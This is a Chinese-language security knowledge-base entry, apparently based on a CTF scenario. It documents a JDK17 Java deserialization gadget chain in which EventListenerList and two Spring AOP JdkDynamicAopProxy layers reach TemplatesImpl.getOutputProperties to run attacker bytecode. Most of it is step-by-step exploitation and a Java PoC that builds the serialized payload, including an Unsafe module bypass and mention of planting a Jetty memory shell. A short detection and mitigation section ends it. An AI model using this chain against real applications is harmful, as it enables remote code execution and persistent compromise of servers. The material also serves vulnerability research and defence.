---
id: web-java-deser-spring-aop-jdk17-templatesimpl-chain
title: JDK17 原生反序列化：EventListenerList 触发 Spring AOP 链反射调用 TemplatesImpl
type: scenario
domain: web
path: web/java/deserialization
technique: spring-aop-jdk17-templatesimpl-chain
aliases:
- Spring AOP 反序列化链
- AspectJAroundAdvice 链
- JdkDynamicAopProxy 反序列化
- EventListenerList + Spring AOP
- JDK17 Spring 原生链
- SpringBootAOP 链
tags:
- java
- deserialization
- spring
- aop
- aspectj
- templatesimpl
- jdk17
- gadget-chain
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V15
  verified_at: '2026-11-05T01:43:41+08:00'
  notes: 已对照原文与图04/05/06/17核对：EventListenerList 触发 toString，Spring AOP 双层代理（Advisor/MethodInterceptor 与 Map）经 JdkDynamicAopProxy 到 AspectJAroundAdvice.invokeAdviceMethod 反射调用 TemplatesImpl.getOutputProperties；图06 复现 Proxy.class 作为内层 loader 时 Advisor not visible 异常；图02 显示 spring 5.3.6/aspectjweaver 1.9.22。原文为 CTF 场景，未声明受影响版本区间。PoC 未在本机执行；frontmatter 无 sources/source_url。
---

## 一句话结论

在 JDK17 下，`BadAttributeValueExpException` 的 toString 触发已失效，可改用 `EventListenerList` 触发任意 `toString`；把 Spring AOP 的 `AspectJAroundAdvice` 包装进两层 `JdkDynamicAopProxy`，可让 `toString` 一路走到 `ReflectiveMethodInvocation.invokeAdviceMethod`，反射调用 `TemplatesImpl.getOutputProperties`，执行 translet 字节码。

## 原理

- JDK15 起 `BadAttributeValueExpException.val` 变为 `String`，原来“反序列化时对任意对象调用 toString”的经典触发失效；`EventListenerList` 的 `readObject → add → UndoManager.toString → CompoundEdit.toString → Vector.toString → String.valueOf` 仍会调用元素的 `toString`，是 JDK17 可用的触发点。
- Spring AOP 提供了一条“从任意方法调用走到反射调用”的现成链：
  - `JdkDynamicAopProxy.invoke` 根据 `AdvisedSupport` 取出 Advisor 链并执行拦截器；
  - `DefaultIntroductionAdvisor` 持有一个 `Advice`（由 `MethodInterceptor` 代理实现）；
  - `AspectJAroundAdvice.invoke` 调用 `invokeAdviceMethod`，按 `declaringClass`/`methodName`/`parameterTypes` 反射调用目标方法。
- 把 `AspectJAroundAdvice` 的 `declaringClass` 设为 `javax.xml.transform.Templates`、`methodName` 设为 `getOutputProperties`、`parameterTypes` 设为空数组，并把 `aspectInstanceFactory` 指向 `SingletonAspectInstanceFactory(TemplatesImpl)`，反射调用就会落到 `TemplatesImpl.getOutputProperties()`，进而 `defineTransletClasses()` 加载 `_bytecodes` 中的 translet 并执行。
- 对象图分两层代理：
  - 内层 `proxy1` 代理接口 `{Advisor, MethodInterceptor}`，InvocationHandler 为绑定 `AdvisedSupport(targetSource=AspectJAroundAdvice)` 的 `JdkDynamicAopProxy`；
  - 外层 `proxy2` 代理接口 `Map`，InvocationHandler 为绑定 `AdvisedSupport(advisors=[DefaultIntroductionAdvisor(proxy1)], advisorChainFactory=DefaultAdvisorChainFactory, targetSource="ape1ron")` 的 `JdkDynamicAopProxy`；
  - 把 `proxy2` 放进 `UndoManager.edits`，再由 `EventListenerList` 触发其 `toString`。
- JDK17 的 `TemplatesImpl` 需要以 JDK17 兼容方式生成 translet 字节码（如 Javassist 生成 `AbstractTranslet` 子类），并在反射写内部字段/`setAccessible` 前用 `Unsafe` 篡改 `Class.module` 绕过强封装。
- 一个易踩的坑：创建 `proxy1` 时若使用 `Proxy.class.getClassLoader()`，会因 Spring 的 `Advisor` 接口对该类加载器不可见而抛 `IllegalArgumentException: org.springframework.aop.Advisor referenced from a method is not visible from class loader`；应使用加载了 Spring AOP 的应用类加载器（通常是当前 exploit 类的 loader）。

## 触发条件

- 目标存在可控的 Java 原生反序列化入口；
- classpath 含 spring-aop/spring-context 与 aspectjweaver（原文版本 Spring 5.3.6、aspectjweaver 1.9.22）；
- 运行在 JDK17 等 `BadAttributeValueExpException` 触发失效的版本；
- `TemplatesImpl` 可用（JDK8 或未移除 Xalan 的 JDK17 发行版），且 `sun.misc.Unsafe` 未被限制（用于模块绕过与字段写入）；
- 未对 `EventListenerList`、`UndoManager`、Spring AOP 类、`TemplatesImpl` 做反序列化白名单。

## 利用步骤

1. 用 Javassist 生成两个 translet 类字节码（第一个执行命令/加载内存马，第二个占位）。
2. 反射创建 `TemplatesImpl`，设置 `_name`、`_transletIndex=0`、`_bytecodes={evil, placeholder}`；JDK17 下先做 `Class.module` 伪造。
3. 创建 `SingletonAspectInstanceFactory(templates)`，反射填充 `AspectJAroundAdvice` 的 `aspectInstanceFactory`、`declaringClass=Templates`、`methodName="getOutputProperties"`、`parameterTypes=new Class[0]`、`pointcut`、joinPoint 索引 -1。
4. 用 `AdvisedSupport(targetSource=SingletonTargetSource(aspectJAroundAdvice))` 创建 `JdkDynamicAopProxy`，再代理接口 `{Advisor, MethodInterceptor}` 得到 `proxy1`。
5. 用 `DefaultIntroductionAdvisor(proxy1)` 构造 advisors，放入第二个 `AdvisedSupport`，并设置 `DefaultAdvisorChainFactory` 与目标对象；代理 `Map` 接口得到 `proxy2`。
6. 把 `proxy2` 加入 `UndoManager.edits`，把 `EventListenerList.listenerList` 设为 `{Class.class, undoManager}`。
7. 原生序列化 `EventListenerList` 并发送；反序列化时触发 `proxy2.toString` → Spring AOP → `TemplatesImpl.getOutputProperties` → 执行字节码。

## PoC

```java
// 1) TemplatesImpl（JDK17 下先篡改 Class.module 再反射写字段）
Object templates = Reflections.newInstanceWithoutConstructor(TemplatesImpl.class);
UnSafeTools.setObject(templates, f("_name"), "whoami");
UnSafeTools.setInt(templates, f("_transletIndex"), 0);
UnSafeTools.setObject(templates, f("_bytecodes"), new byte[][]{evil, placeholder});

// 2) AspectJAroundAdvice：把反射目标指向 TemplatesImpl.getOutputProperties
SingletonAspectInstanceFactory factory = new SingletonAspectInstanceFactory(templates);
AspectJAroundAdvice advice = Reflections.newInstanceWithoutConstructor(AspectJAroundAdvice.class);
set(advice, "aspectInstanceFactory", factory);
set(advice, "declaringClass", Templates.class);
set(advice, "methodName", "getOutputProperties");
set(advice, "parameterTypes", new Class[0]);
set(advice, "pointcut", new AspectJExpressionPointcut());
setInt(advice, "joinPointArgumentIndex", -1);
setInt(advice, "joinPointStaticPartArgumentIndex", -1);

// 3) 内层代理：Advisor + MethodInterceptor
AdvisedSupport as1 = new AdvisedSupport();
as1.setTargetSource(new SingletonTargetSource(advice));
InvocationHandler ih1 = new JdkDynamicAopProxy(as1);
Object proxy1 = Proxy.newProxyInstance(
        Exploit.class.getClassLoader(),          // 必须能看见 Spring 接口
        new Class[]{Advisor.class, MethodInterceptor.class}, ih1);

// 4) 外层代理：Map，Advisor 指向 proxy1
List<Advisor> advisors = new ArrayList<>();
advisors.add(new DefaultIntroductionAdvisor((Advice) proxy1));
AdvisedSupport as2 = new AdvisedSupport();
set(as2, "advisors", advisors);
set(as2, "advisorChainFactory", new DefaultAdvisorChainFactory());
as2.setTargetSource(new SingletonTargetSource("ape1ron"));
InvocationHandler ih2 = new JdkDynamicAopProxy(as2);
Object proxy2 = Proxy.newProxyInstance(
        Proxy.class.getClassLoader(), new Class[]{Map.class}, ih2);

// 5) EventListenerList 触发 proxy2.toString
EventListenerList list = new EventListenerList();
UndoManager manager = new UndoManager();
((Vector) get(manager, "edits")).add(proxy2);
set(list, "listenerList", new Object[]{InternalError.class, manager});

// 6) 原生序列化并发送
ByteArrayOutputStream baos = new ByteArrayOutputStream();
new ObjectOutputStream(baos).writeObject(list);
```

调用链（摘要）：

```text
EventListenerList.readObject
  -> add -> UndoManager.toString -> CompoundEdit.toString -> Vector.toString
    -> String.valueOf(proxy2) -> proxy2.toString
      -> JdkDynamicAopProxy.invoke -> DefaultAdvisorChainFactory
        -> DefaultIntroductionAdvisor -> proxy1.invoke
          -> ReflectiveMethodInvocation.proceed
            -> AspectJAroundAdvice.invoke -> invokeAdviceMethod
              -> TemplatesImpl.getOutputProperties -> defineTransletClasses -> exec
```

## 变体与关联

- 触发点变体：`EventListenerList` 可替换为其它在 JDK17 仍可触发 toString/equals 的 gadget；`proxy2` 也可作为 `HashMap`/`TreeMap` key 触发。
- 字节码变体：translet 内执行命令，或加载 Jetty/Tomcat/Spring 内存马类；原文最终用该链注入 Jetty 11 内存马。
- 环境变体：JDK8 下可继续用 `BadAttributeValueExpException` 触发；JDK17 需模块绕过与 JDK17 兼容的 translet 生成方式。
- 类加载器坑：内层代理接口必须对代理类加载器可见，否则 `ensureVisible` 失败；优先使用应用类加载器。
- 关联：[[web-java-deserialization-jdk-eventlistenerlist-tostring]]（触发链）；[[web-java-classloader-jdk17-class-module-field-spoof]]（模块绕过）；[[web-java-component-jetty11-threadlocal-header-memshell]]（本链的落地载荷）；[[web-java-deserialization-external-xalan-templatesimpl-sink]]（TemplatesImpl sink）。
- 影响边界：成功时执行任意 translet 字节码，权限同应用进程；依赖 Spring AOP/aspectjweaver 与 TemplatesImpl 可用性。

## 检测与防御

- 检测：反序列化流中出现 `EventListenerList`、`UndoManager`、`AspectJAroundAdvice`、`AspectJExpressionPointcut`、`JdkDynamicAopProxy`、`DefaultIntroductionAdvisor`、`TemplatesImpl` 等类名；JVM 运行期动态生成 `AbstractTranslet` 子类；`TemplatesImpl.getOutputProperties` 附近出现反射调用。
- 修复：对不可信数据禁止原生反序列化；必须使用时启用严格类允许列表，拒绝 Spring AOP/`TemplatesImpl` 等 gadget 类。
- 缓解：升级 JDK 并开启 JEP 290 序列化过滤器；限制 `sun.misc.Unsafe` 与动态类定义；移除不必要的 aspectjweaver 依赖。
